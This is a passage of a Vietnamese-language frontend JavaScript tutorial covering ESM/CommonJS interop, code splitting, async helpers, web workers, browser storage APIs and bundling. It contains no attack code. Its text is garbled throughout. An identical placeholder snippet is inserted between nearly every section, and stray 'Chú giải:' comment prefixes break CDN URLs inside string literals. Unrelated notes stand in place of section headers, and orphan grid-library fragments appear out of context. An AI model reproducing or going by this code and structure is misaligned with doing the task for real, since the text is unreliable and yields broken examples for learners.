    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}

 // Chú giải: Vue example
import { defineAsyncComponent } from 'vue';

const AsyncComp = defineAsyncComponent(() =>
  import('./components/AsyncComponent.vue')
);

 // Chú giải: Manual code splitting với dynamic import
async function loadFeature() {
  // Webpack/Vite sẽ tự động tạo separate chunk
  const { feature } = await import('./heavy-feature');
  feature();
}

 // Chú giải: Preload important chunks
document.addEventListener('DOMContentLoaded', () => {
 // Chú giải: Preload chunk for better UX
  import(/* webpackPreload: true */ './important-feature');
});

 // Chú giải: ============================================
 // Chú giải: INTEROPERABILITY: CJS ↔ ESM
 // Chú giải: ============================================
/**
 * Vietnamese Explanation:
 *
 * Mixing CommonJS và ESM có thể tricky
 * - ESM có thể import CJS (Node.js tự convert)
 * - CJS KHÔNG thể synchronously require ESM
 * - Need dynamic import() cho CJS → ESM
 */

 // Chú giải: ESM importing CommonJS
import cjsModule from './commonjs-module.js'; // Chú giải: Works
import { namedExport } from './commonjs-module.js'; // Chú giải: Works if exports.namedExport

 // Chú giải: CommonJS importing ESM
const esmModule = require('./esm-module.mjs'); // Chú giải: ❌ Error!
 // Chú giải: Solution: Use dynamic import
(async () => {
  const esmModule = await import('./esm-module.mjs'); // Chú giải: ✅ Works
})();

 // Chú giải: ============================================
 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
 // Chú giải: ============================================

 // Chú giải: Dual package (support both CJS and ESM)
{
  "name": "my-package",
  "version": "1.0.0",
  "type": "module", // Chú giải: Default to ESM

 // Chú giải: Exports field (Node.js 12+)
  "exports": {
    ".": {
      "import": "./dist/index.mjs", // Chú giải: ESM version
      "require": "./dist/index.cjs" // Chú giải: CJS version
    },
    "./utils": {
      "import": "./dist/utils.mjs",
      "require": "./dist/utils.cjs"
    }
  },

 // Chú giải: Fallback for older tools
  "main": "./dist/index.cjs", // Chú giải: CJS entry
  "module": "./dist/index.mjs", // Chú giải: ESM entry

 // Chú giải: TypeScript types
  "types": "./dist/index.d.ts",

 // Chú giải: Tree-shaking hints
  "sideEffects": false
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ Sai: Mixing require trong ESM
import React from 'react';
const lodash = require('lodash'); // Chú giải: Error trong ESM!

// ✅ Đúng: Consistent import syntax
import React from 'react';
import _ from 'lodash';

 // Chú giải: ❌ Sai: Dynamic import path trong top-level ESM
const moduleName = './utils';
import { fn } from moduleName; // Chú giải: Error - must be static!

// ✅ Đúng: Use dynamic import() for runtime paths
const moduleName = './utils';
const { fn } = await import(moduleName);

 // Chú giải: ❌ Sai: Forget file extension trong browser ESM
import { add } from './math'; // Chú giải: Error - need .js!

// ✅ Đúng: Always include extension
import { add } from './math.js';

 // Chú giải: ❌ Sai: CommonJS exports trong ESM file
export const a = 1;
module.exports = { a }; // Chú giải: Error - can't mix!

// ✅ Đúng: Use ESM syntax only
export const a = 1;
export default { a };

// ❌ Sai: Không config CORS cho ESM từ CDN
<script type="module">
  import lib from 'https: // Chú giải: wrong-cdn.com/lib.js'; // CORS error!
</script>

// ✅ Đúng: Use ESM-compatible CDNs
<script type="module">
  import lib from 'https: // Chú giải: cdn.skypack.dev/lib'; // Works!
</script>

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Bundler speed comparison (1000 modules):
 // Chú giải: - esbuild: ~0.5s ⚡ (Go-based, parallel)
 // Chú giải: - Rollup: ~5s (JavaScript, good tree-shaking)
 // Chú giải: - Webpack: ~10s (JavaScript, complex config)
 // Chú giải: - Parcel: ~8s (JavaScript, zero-config)

 // Chú giải: Bundle size comparison (after tree-shaking):
 // Chú giải: - ESM only: 100KB (best tree-shaking)
 // Chú giải: - ESM + CJS mixed: 150KB (some dead code)
 // Chú giải: - CJS only: 200KB (no tree-shaking)

```js
// Ví dụ rút gọn
const example = 42;
```

ts
 // Chú giải: 1) Abort fetch với timeout
function fetchWithTimeout(url: string, ms = 5000) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), ms);
  return fetch(url, { signal: ctrl.signal }).finally(() => clearTimeout(t));
}

// 2) Concurrency limit (semaphore đơn giản)
function createLimiter(max: number) {
  let active = 0;
  const queue: Array<() => void> = [];
  const next = () => {
    active--;
    queue.shift()?.();
  };
  return async function run<T>(fn: () => Promise<T>): Promise<T> {
    if (active >= max) await new Promise<void>((res) => queue.push(res));
    active++;
    try {
      return await fn();
    } finally {
      next();
    }
  };
}

 // Chú giải: 3) Retry + backoff + jitter
async function retry<T>(op: () => Promise<T>, tries = 3) {
  let attempt = 0;
  while (true) {
    try {
      return await op();
    } catch (e) {
      if (++attempt >= tries) throw e;
      const base = 2 ** attempt * 100;
      const jitter = Math.random() * 100;
      await new Promise((r) => setTimeout(r, base + jitter));
    }
  }
}

```js
// Ví dụ rút gọn
const example = 42;
```

ts
// ❌ Retry vô hạn, không jitter → dồn tải (thundering herd)

```js
// Ví dụ rút gọn
const example = 42;
```

ts
 // Chú giải: worker.ts
self.onmessage = (e) => {
  const n: number = e.data;
  postMessage(n * 2);
};

 // Chú giải: main.ts
const worker = new Worker(new URL('./worker.ts', import.meta.url));
worker.postMessage(21);
worker.onmessage = (e) => console.log(e.data); // Chú giải: 42

 // Chú giải: service worker (sw.js)
self.addEventListener('install', (e) => {
  e.waitUntil(caches.open('v1').then((c) => c.addAll(['/', '/style.css'])));
});
self.addEventListener('fetch', (e) => {
  e.respondWith(caches.match(e.request).then((r) => r || fetch(e.request)));
});

```js
// Ví dụ rút gọn
const example = 42;
```

ts
// ❌ Dùng DOM API bên trong Worker → không có sẵn

```js
// Ví dụ rút gọn
const example = 42;
```

┌────────────────────────────────────────────────────────────────────────┐
│                    BROWSER STORAGE COMPARISON                          │
├────────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  Tiêu Chí          │ Cookie    │ LocalStorage │ SessionStorage │ IndexedDB │
│  ─────────────────────────────────────────────────────────────────── │
│  Dung lượng        │ 4KB       │ 5-10MB       │ 5-10MB         │ 50MB+     │
│  Tồn tại           │ Expiry    │ Mãi mãi      │ Đóng tab mất   │ Mãi mãi   │
│  API               │ Sync      │ Sync         │ Sync           │ Async     │
│  Gửi server        │ ✅ Tự động│ ❌ Không     │ ❌ Không       │ ❌ Không  │
│  Complexity        │ Medium    │ Easy         │ Easy           │ Hard      │
│  Use Case          │ Auth      │ Settings     │ Form data      │ Big data  │
│  ─────────────────────────────────────────────────────────────────── │
│                                                                        │
│  🍪 Cookie:        Như tem dán lên thư gửi đi (mọi request)          │
│  💾 LocalStorage:  Như USB drive (cắm mãi mãi)                        │
│  📝 SessionStorage: Như giấy nháp (hết giờ là vứt)                    │
│  🗄️ IndexedDB:     Như kho chứa lớn (chứa cả thùng hàng)             │
└────────────────────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
// COOKIE - Ví Dụ Đơn Giản
 // Chú giải: ============================================

 // Chú giải: 1️⃣ SET Cookie - Lưu token
function setCookie(name: string, value: string, days: number = 7) {
  const date = new Date();
  date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000); // Tính expiry
  const expires = `expires=${date.toUTCString()}`;

 // Chú giải: Lưu cookie
  document.cookie = `${name}=${value}; ${expires}; path=/; SameSite=Strict`;
  // path=/     → cookie có hiệu lực toàn site
 // Chú giải: SameSite   → bảo mật CSRF
}

 // Chú giải: Usage: Lưu auth token
setCookie('authToken', 'abc123xyz', 7); // Hết hạn sau 7 ngày

// 2️⃣ GET Cookie - Đọc token
function getCookie(name: string): string | null {
 // Chú giải: document.cookie = "authToken=abc123; userId=456; theme=dark"
  const cookies = document.cookie.split('; ');

  for (const cookie of cookies) {
    const [key, value] = cookie.split('=');
    if (key === name) return value;
  }

  return null; // Không tìm thấy
}

// Usage: Đọc auth token
const token = getCookie('authToken');
console.log(token); // Chú giải: "abc123xyz"

// 3️⃣ DELETE Cookie - Xóa token (set expiry = quá khứ)
function deleteCookie(name: string) {
  document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
}

// Usage: Logout - xóa token
deleteCookie('authToken');

 // Chú giải: ============================================
// Thực Tế: Cookie Helper Class
 // Chú giải: ============================================
class CookieManager {
 // Chú giải: Set cookie
  static set(name: string, value: string, days: number = 7): void {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Strict`;
  }

 // Chú giải: Get cookie
  static get(name: string): string | null {
    return document.cookie
      .split('; ')
      .find(row => row.startsWith(name + '='))
      ?.split('=')[1] || null;
  }

 // Chú giải: Delete cookie
  static delete(name: string): void {
    document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
  }
}

 // Chú giải: Usage: Clean API
CookieManager.set('user', 'John', 30); // Lưu 30 ngày
const user = CookieManager.get('user'); // Chú giải: "John"
CookieManager.delete('user'); // Xóa

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
// LOCALSTORAGE - Ví Dụ Đơn Giản
 // Chú giải: ============================================

 // Chú giải: 1️⃣ LƯU DATA (setItem)
 // Chú giải: Lưu string
localStorage.setItem('username', 'John Doe');

 // Chú giải: Lưu object (phải stringify)
const user = { id: 1, name: 'John', role: 'admin' };
localStorage.setItem('user', JSON.stringify(user));

 // Chú giải: Lưu array
const cart = [
  { id: 1, name: 'iPhone', price: 999 },
  { id: 2, name: 'AirPods', price: 199 },
];
localStorage.setItem('cart', JSON.stringify(cart));

// 2️⃣ ĐỌC DATA (getItem)
// Đọc string
const username = localStorage.getItem('username');
console.log(username); // Chú giải: "John Doe"

// Đọc object (phải parse)
const userStr = localStorage.getItem('user');
const userObj = userStr ? JSON.parse(userStr) : null;
console.log(userObj); // Chú giải: { id: 1, name: 'John', role: 'admin' }

// Đọc array
const cartStr = localStorage.getItem('cart');
const cartArray = cartStr ? JSON.parse(cartStr) : [];
console.log(cartArray); // Chú giải: [{ id: 1, ... }, { id: 2, ... }]

// 3️⃣ XÓA DATA
// Xóa 1 item
localStorage.removeItem('username');

// Xóa tất cả
localStorage.clear();

 // Chú giải: 4️⃣ CHECK TỒN TẠI
if (localStorage.getItem('user')) {
  console.log('User logged in');
} else {
  console.log('Guest');
}

 // Chú giải: ============================================
// Thực Tế: LocalStorage Helper
 // Chú giải: ============================================
class LocalStorageHelper {
  // Set data (tự động stringify)
  static set<T>(key: string, value: T): void {
    try {
      const serialized = JSON.stringify(value);
      localStorage.setItem(key, serialized);
    } catch (error) {
      console.error('LocalStorage set error:', error);
    }
  }

  // Get data (tự động parse)
  static get<T>(key: string, defaultValue: T | null = null): T | null {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch (error) {
      console.error('LocalStorage get error:', error);
      return defaultValue;
    }
  }

 // Chú giải: Remove item
  static remove(key: string): void {
    localStorage.removeItem(key);
  }

 // Chú giải: Clear all
  static clear(): void {
    localStorage.clear();
  }
}

 // Chú giải: Usage: Clean API
interface User {
  id: number;
  name: string;
  role: string;
}

const user: User = { id: 1, name: 'John', role: 'admin' };
LocalStorageHelper.set('user', user); // Chú giải: Tự stringify

const savedUser = LocalStorageHelper.get<User>('user'); // Chú giải: Tự parse
console.log(savedUser?.name); // Chú giải: "John"

LocalStorageHelper.remove('user'); // Xóa

 // Chú giải: ============================================
// Use Case Thực Tế: Theme Switcher
 // Chú giải: ============================================
function saveTheme(theme: 'light' | 'dark') {
  localStorage.setItem('theme', theme);
  document.body.className = theme; // Chú giải: Apply theme
}

function loadTheme() {
  const theme = localStorage.getItem('theme') || 'light';
  document.body.className = theme;
}

 // Chú giải: On page load
loadTheme();

 // Chú giải: On theme button click
document.getElementById('themeBtn')?.addEventListener('click', () => {
  const current = localStorage.getItem('theme') || 'light';
  const newTheme = current === 'light' ? 'dark' : 'light';
  saveTheme(newTheme);
});

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
// SESSIONSTORAGE - Ví Dụ Đơn Giản
 // Chú giải: ============================================

// API GIỐNG HỆT LOCALSTORAGE, CHỈ KHÁC TÊN!

 // Chú giải: 1️⃣ LƯU DATA
sessionStorage.setItem('formData', JSON.stringify({
  step: 1,
  name: 'John',
  email: 'john@example.com'
}));

// 2️⃣ ĐỌC DATA
const formDataStr = sessionStorage.getItem('formData');
const formData = formDataStr ? JSON.parse(formDataStr) : null;
console.log(formData?.step); // Chú giải: 1

// 3️⃣ XÓA DATA
sessionStorage.removeItem('formData');
sessionStorage.clear(); // Xóa tất cả

 // Chú giải: ============================================
 // Chú giải: Use Case: Multi-Step Form (Wizard)
 // Chú giải: ============================================
interface FormState {
  currentStep: number;
  data: {
    name?: string;
    email?: string;
    address?: string;
  };
}

class FormWizard {
  private static KEY = 'wizardState';

  // Lưu state hiện tại
  static saveState(state: FormState): void {
    sessionStorage.setItem(this.KEY, JSON.stringify(state));
  }

  // Đọc state (auto-load khi refresh page)
  static loadState(): FormState | null {
    const data = sessionStorage.getItem(this.KEY);
    return data ? JSON.parse(data) : null;
  }

  // Xóa state (sau khi submit)
  static clearState(): void {
    sessionStorage.removeItem(this.KEY);
  }
}

 // Chú giải: Usage:
 // Chú giải: Step 1: Save form data
FormWizard.saveState({
  currentStep: 1,
  data: { name: 'John', email: 'john@example.com' }
});

 // Chú giải: User refresh page → auto-restore
const state = FormWizard.loadState();
if (state) {
  console.log(`Resume from step ${state.currentStep}`);
  // Fill form với data đã lưu
}

 // Chú giải: Step 3: Submit success → clear
FormWizard.clearState();

 // Chú giải: ============================================
// So Sánh LocalStorage vs SessionStorage
 // Chú giải: ============================================

// Scenario 1: User settings (dùng localStorage)
localStorage.setItem('language', 'vi'); // Lưu mãi mãi
// → User quay lại sau 1 tháng vẫn thấy tiếng Việt

// Scenario 2: Shopping cart (dùng localStorage)
localStorage.setItem('cart', JSON.stringify(items)); // Lưu mãi mãi
// → User đóng tab rồi mở lại, cart vẫn còn

// Scenario 3: Form draft (dùng sessionStorage)
sessionStorage.setItem('draft', JSON.stringify(formData)); // Mất khi đóng tab
// → User đóng tab = mất draft (không spam localStorage)

// Scenario 4: Search filters (dùng sessionStorage)
sessionStorage.setItem('filters', JSON.stringify(filters)); // Chú giải: Per-tab
// → Mỗi tab có filter riêng, không conflict

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
// INDEXEDDB - Ví Dụ Đơn Giản (Simplified với Promise)
 // Chú giải: ============================================

 // Chú giải: 1️⃣ MỞ DATABASE
function openDB(dbName: string, version: number = 1): Promise<IDBDatabase> {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(dbName, version);

    // onupgradeneeded: Chạy khi tạo DB lần đầu hoặc upgrade version
    request.onupgradeneeded = (event) => {
      const db = (event.target as IDBOpenDBRequest).result;

      // Tạo "table" (gọi là objectStore)
      if (!db.objectStoreNames.contains('users')) {
        const store = db.createObjectStore('users', { keyPath: 'id' });
        // keyPath: 'id' → dùng field 'id' làm primary key

 // Chú giải: Tạo index (giống SQL index)
        store.createIndex('email', 'email', { unique: true });
        store.createIndex('name', 'name', { unique: false });
      }
    };

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

// 2️⃣ THÊM DATA (INSERT)
async function addUser(db: IDBDatabase, user: any): Promise<void> {
  return new Promise((resolve, reject) => {
 // Chú giải: Tạo transaction (như BEGIN TRANSACTION trong SQL)
    const tx = db.transaction('users', 'readwrite'); // readwrite = có thể ghi
    const store = tx.objectStore('users');

    // Thêm data
    const request = store.add(user);

    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);
  });
}

// 3️⃣ ĐỌC DATA (SELECT)
async function getUser(db: IDBDatabase, id: number): Promise<any> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readonly'); // readonly = chỉ đọc
    const store = tx.objectStore('users');

    const request = store.get(id); // Tìm theo primary key

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

// 4️⃣ ĐỌC TẤT CẢ (SELECT *)
async function getAllUsers(db: IDBDatabase): Promise<any[]> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readonly');
    const store = tx.objectStore('users');

    const request = store.getAll(); // Chú giải: Lấy tất cả

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

 // Chú giải: 5️⃣ CẬP NHẬT (UPDATE)
async function updateUser(db: IDBDatabase, user: any): Promise<void> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readwrite');
    const store = tx.objectStore('users');

    const request = store.put(user); // put = thêm hoặc update

    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);
  });
}

// 6️⃣ XÓA (DELETE)
async function deleteUser(db: IDBDatabase, id: number): Promise<void> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readwrite');
    const store = tx.objectStore('users');

    const request = store.delete(id);

    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);
  });
}

 // Chú giải: ============================================
// USAGE - Sử Dụng Thực Tế
 // Chú giải: ============================================
async function demo() {
 // Chú giải: Mở database
  const db = await openDB('MyAppDB', 1);

  // Thêm users
  await addUser(db, { id: 1, name: 'John', email: 'john@example.com' });
  await addUser(db, { id: 2, name: 'Jane', email: 'jane@example.com' });

  // Đọc 1 user
  const user = await getUser(db, 1);
  console.log(user); // Chú giải: { id: 1, name: 'John', email: 'john@example.com' }

  // Đọc tất cả users
  const users = await getAllUsers(db);
  console.log(users); // Chú giải: [{ id: 1, ... }, { id: 2, ... }]

 // Chú giải: Update user
  await updateUser(db, { id: 1, name: 'John Doe', email: 'john@example.com' });

  // Xóa user
  await deleteUser(db, 2);

  // Đóng database
  db.close();
}

demo();

 // Chú giải: ============================================
// Use Case Thực Tế: Offline App
 // Chú giải: ============================================
class OfflineCache {
  private db: IDBDatabase | null = null;

  async init() {
    this.db = await openDB('OfflineCache', 1);
  }

 // Chú giải: Cache API response
  async cacheArticle(article: any) {
    if (!this.db) return;
    await addUser(this.db, article);
  }

 // Chú giải: Get từ cache
  async getArticle(id: number) {
    if (!this.db) return null;
    return await getUser(this.db, id);
  }
}

 // Chú giải: Usage:
const cache = new OfflineCache();
await cache.init();

 // Chú giải: Online: Fetch từ API + cache
const article = await fetch('/api/article/1').then(r => r.json());
await cache.cacheArticle(article);

// Offline: Đọc từ cache
const cached = await cache.getArticle(1);

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
// DECISION TREE - Chọn Storage Phù Hợp
 // Chú giải: ============================================

function selectStorage(requirement: Requirement): Storage {
 // Chú giải: 1. Cần gửi server? → Cookie
  if (requirement.sendToServer) {
    return 'Cookie'; // Chú giải: Auth tokens, session IDs
  }

 // Chú giải: 2. Data lớn (>5MB)? → IndexedDB
  if (requirement.size > 5_000_000) {
    return 'IndexedDB'; // Chú giải: Images, videos, large datasets
  }

  // 3. Cần persistent (lưu mãi mãi)? → LocalStorage
  if (requirement.persistent) {
    return 'LocalStorage'; // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
  }

  // 4. Temporary (đóng tab = mất)? → SessionStorage
  if (requirement.temporary) {
    return 'SessionStorage'; // Chú giải: Form drafts, wizard steps
  }

 // Chú giải: Default: LocalStorage
  return 'LocalStorage';
}

 // Chú giải: ============================================
// Use Cases Thực Tế
 // Chú giải: ============================================

 // Chú giải: ✅ Cookie:
 // Chú giải: - Authentication tokens (JWT)
 // Chú giải: - Session IDs
 // Chú giải: - User tracking, analytics

 // Chú giải: ✅ LocalStorage:
 // Chú giải: - User settings (theme, language)
 // Chú giải: - Shopping cart
 // Chú giải: - Cached data (API responses)
 // Chú giải: - Recently viewed items

 // Chú giải: ✅ SessionStorage:
 // Chú giải: - Multi-step form data
 // Chú giải: - Wizard progress
 // Chú giải: - Search filters (per-tab)
 // Chú giải: - Temporary state

 // Chú giải: ✅ IndexedDB:
 // Chú giải: - Offline apps (PWA)
 // Chú giải: - Large datasets (1000+ items)
 // Chú giải: - Images, videos
 // Chú giải: - Full-text search indexes

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// 1️⃣ ALWAYS TRY-CATCH (storage có thể full hoặc disabled)
function safeSetItem(key: string, value: any) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch (error) {
    if (error instanceof DOMException && error.name === 'QuotaExceededError') {
      console.error('Storage full!');
      // Clear old data hoặc notify user
    }
  }
}

 // Chú giải: 2️⃣ CHECK AVAILABILITY
function isLocalStorageAvailable(): boolean {
  try {
    const test = '__test__';
    localStorage.setItem(test, test);
    localStorage.removeItem(test);
    return true;
  } catch {
    return false; // User disabled hoặc browser không support
  }
}

// 3️⃣ NAMESPACE KEYS (tránh conflict)
const STORAGE_PREFIX = 'myapp_';

function setAppData(key: string, value: any) {
  localStorage.setItem(STORAGE_PREFIX + key, JSON.stringify(value));
}

function getAppData(key: string) {
  const item = localStorage.getItem(STORAGE_PREFIX + key);
  return item ? JSON.parse(item) : null;
}

 // Chú giải: Usage:
setAppData('user', { name: 'John' }); // Chú giải: Lưu: "myapp_user"

// 4️⃣ VERSIONING (để migration)
interface StorageData<T> {
  version: number;
  data: T;
}

function setVersionedData<T>(key: string, data: T, version: number = 1) {
  const wrapper: StorageData<T> = { version, data };
  localStorage.setItem(key, JSON.stringify(wrapper));
}

function getVersionedData<T>(key: string, currentVersion: number): T | null {
  const item = localStorage.getItem(key);
  if (!item) return null;

  const wrapper: StorageData<T> = JSON.parse(item);

  if (wrapper.version !== currentVersion) {
 // Chú giải: Migration logic here
    console.warn('Old data version, migrating...');
    return null;
  }

  return wrapper.data;
}

 // Chú giải: 5️⃣ EXPIRY for LocalStorage (giống cookie)
interface CachedData<T> {
  data: T;
  expiry: number; // Chú giải: timestamp
}

function setWithExpiry<T>(key: string, value: T, ttlMs: number) {
  const item: CachedData<T> = {
    data: value,
    expiry: Date.now() + ttlMs,
  };
  localStorage.setItem(key, JSON.stringify(item));
}

function getWithExpiry<T>(key: string): T | null {
  const itemStr = localStorage.getItem(key);
  if (!itemStr) return null;

  const item: CachedData<T> = JSON.parse(itemStr);

 // Chú giải: Check expiry
  if (Date.now() > item.expiry) {
    localStorage.removeItem(key); // Expired, xóa đi
    return null;
  }

  return item.data;
}

 // Chú giải: Usage: Cache API response trong 1 giờ
setWithExpiry('apiCache', { users: [...] }, 60 * 60 * 1000); // Chú giải: 1 hour

const cached = getWithExpiry('apiCache');
if (cached) {
  console.log('Use cache');
} else {
  console.log('Cache expired, fetch new');
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ LỖI 1: Lưu object trực tiếp (không stringify)
localStorage.setItem('user', { name: 'John' }); // Chú giải: ❌ Lưu "[object Object]"

// ✅ ĐÚNG: Stringify trước
localStorage.setItem('user', JSON.stringify({ name: 'John' }));

// ❌ LỖI 2: Quên parse khi đọc
const user = localStorage.getItem('user'); // ❌ user là string!
console.log(user.name); // Chú giải: undefined

// ✅ ĐÚNG: Parse sau khi đọc
const userStr = localStorage.getItem('user');
const user = userStr ? JSON.parse(userStr) : null;
console.log(user?.name); // Chú giải: "John"

// ❌ LỖI 3: Lưu sensitive data vào localStorage
localStorage.setItem('password', 'secret123'); // ❌ Không secure!

// ✅ ĐÚNG: Chỉ lưu non-sensitive data
// Sensitive data (passwords, credit cards) → server session hoặc httpOnly cookie

// ❌ LỖI 4: Không check quota exceeded
for (let i = 0; i < 10000; i++) {
  localStorage.setItem(`key${i}`, 'x'.repeat(1000)); // ❌ Có thể full!
}

// ✅ ĐÚNG: Try-catch
try {
  localStorage.setItem('key', largeData);
} catch (error) {
  if (error.name === 'QuotaExceededError') {
    console.error('Storage full, clearing old data');
    localStorage.clear();
  }
}

// ❌ LỖI 5: Dùng IndexedDB cho data nhỏ
await openDB(...); // Chú giải: ❌ Overkill cho lưu 1 string
await addUser(db, { name: 'John' });

// ✅ ĐÚNG: LocalStorage cho data nhỏ
localStorage.setItem('name', 'John'); // Đơn giản hơn nhiều

// ❌ LỖI 6: Quên đóng IndexedDB connection
const db = await openDB('MyDB', 1);
 // Chú giải: ... use db
// ❌ Không đóng → memory leak

// ✅ ĐÚNG: Luôn đóng
const db = await openDB('MyDB', 1);
try {
 // Chú giải: ... use db
} finally {
  db.close(); // Chú giải: Always close
}

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   getRowId: (params) => params.data.id // Chú giải: Phải unique & stable!

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   gridRef.current.api.applyTransactionAsync({ update: rows });

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ===================================================
// ❌ KHÔNG DÙNG BUNDLING - Website có 100 files
 // Chú giải: ===================================================

 // Chú giải: index.html
<!DOCTYPE html>
<html>
<head>
  <!-- ❌ Load 100 files riêng biệt! -->
  <script src="/js/utils.js"></script>
  <script src="/js/api.js"></script>
  <script src="/js/auth.js"></script>
  <script src="/js/components/Button.js"></script>
  <script src="/js/components/Input.js"></script>
  <!-- ...95 files khác -->
</head>
</html>

// 🚨 VẤN ĐỀ:
// ❌ 100 HTTP requests → CỰC CHẬM! (mỗi request có latency ~50-100ms)
// ❌ Total latency: 100 files × 100ms = 10 giây chỉ để load files! 😱
// ❌ HTTP/1.1: Chỉ 6-8 connections đồng thời → phải chờ từng wave
// ❌ Không optimize được (không minify, tree-shake được)

 // Chú giải: ===================================================
// ✅ DÙNG BUNDLING - Gộp thành 1 file
 // Chú giải: ===================================================

 // Chú giải: index.html
<!DOCTYPE html>
<html>
<head>
  <!-- ✅ Load 1 file duy nhất! -->
  <script src="/js/bundle.js"></script>
</head>
</html>

// bundle.js (gộp 100 files thành 1)
 // Chú giải: - Chứa tất cả code từ 100 files
// - Đã minify (nén nhỏ hơn)
// - Đã tree-shake (loại code thừa)

// ✅ LỢI ÍCH:
 // Chú giải: ✅ 1 HTTP request → NHANH HƠN 100x!
// ✅ Latency: 1 file × 100ms = 100ms (vs 10 giây)
// ✅ Có thể optimize (minify, compress, cache)

```js
// Ví dụ rút gọn
const example = 42;
```

┌──────────────────────────────────────────────────────────┐
│               BUNDLING PROCESS (QUY TRÌNH GỘP FILE)      │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  📁 INPUT: Source files (nhiều files)                   │
│  ├── src/                                               │
│  │   ├── index.js        (10 KB)   ← Entry point       │
│  │   ├── utils.js        (5 KB)                         │
│  │   ├── api.js          (8 KB)                         │
│  │   └── components/                                    │
│  │       ├── Button.js   (3 KB)                         │
│  │       └── Input.js    (4 KB)                         │
│  │                                                       │
│  │   Total: 5 files, 30 KB                             │
│  └─────────────────────────────────────────────────     │
│                                                          │
│  🔍 STEP 1: Dependency Resolution (Phân tích phụ thuộc) │
│  ├── Bundler đọc index.js (entry point)                │
│  ├── Tìm tất cả imports/requires trong index.js        │
│  ├── Đệ quy tìm imports trong utils.js, api.js, ...    │
│  └── Tạo dependency graph (sơ đồ phụ thuộc):           │
│      index.js                                           │
│        ├─ utils.js                                      │
│        ├─ api.js                                        │
│        │   └─ utils.js (đã có, skip)                   │
│        └─ components/                                   │
│            ├─ Button.js                                 │
│            └─ Input.js                                  │
│                                                          │
│  🔄 STEP 2: Transform (Biến đổi code)                  │
│  ├── TypeScript → JavaScript (nếu dùng TS)             │
│  ├── JSX → JavaScript (nếu dùng React)                 │
│  ├── ES6+ → ES5 (nếu cần hỗ trợ IE11)                  │
│  └── CSS Modules → Scoped CSS                          │
│                                                          │
│  🌲 STEP 3: Tree Shaking (Loại code thừa)             │
│  ├── Phân tích exports/imports                         │
│  ├── Loại bỏ functions/variables không dùng           │
│  └── 30 KB → 22 KB (loại 8 KB code thừa)              │
│                                                          │
│  📦 STEP 4: Bundle (Gộp files)                         │
│  ├── Gộp tất cả files thành 1 file                     │
│  ├── Wrap mỗi module trong function scope              │
│  └── 22 KB code trong 1 file: bundle.js                │
│                                                          │
│  🗜️ STEP 5: Minify (Nén code)                          │
│  ├── Remove whitespace, comments                       │
│  ├── Shorten variable names (userName → a)            │
│  ├── Remove unused code                                │
│  └── 22 KB → 8 KB (nén 64%!)                           │
│                                                          │
│  📤 OUTPUT: Bundle file (1 file duy nhất)              │
│  └── dist/                                              │
│      └── bundle.min.js   (8 KB)  ← 1 file tối ưu!     │
│                                                          │
│  ✅ KẾT QUẢ: 5 files (30 KB) → 1 file (8 KB)          │
│  ✅ Giảm 73% kích thước!                                │
│  ✅ Giảm từ 5 HTTP requests → 1 request!               │
└──────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ===================================================
// 📁 TRƯỚC BUNDLING - Nhiều files riêng biệt
 // Chú giải: ===================================================

 // Chú giải: src/utils.js
export function add(a, b) {
  return a + b;
}

export function subtract(a, b) {
  return a - b;
}

 // Chú giải: src/api.js
import { add } from './utils.js';

export async function fetchData() {
  const response = await fetch('/api/data');
  const data = await response.json();
  return add(data.count, 10); // Dùng add từ utils
}

 // Chú giải: src/index.js (Entry point)
import { fetchData } from './api.js';
import { subtract } from './utils.js';

async function main() {
  const result = await fetchData();
  const final = subtract(result, 5);
  console.log(final);
}

main();

 // Chú giải: ===================================================
 // Chú giải: 📦 SAU BUNDLING - 1 file duy nhất (bundle.js)
 // Chú giải: ===================================================

// dist/bundle.js (Simplified version - thực tế phức tạp hơn)
(function() {
 // Chú giải: Module: utils.js
  const utils = {
    add: function(a, b) { return a + b; },
    subtract: function(a, b) { return a - b; }
  };

 // Chú giải: Module: api.js
  const api = {
    fetchData: async function() {
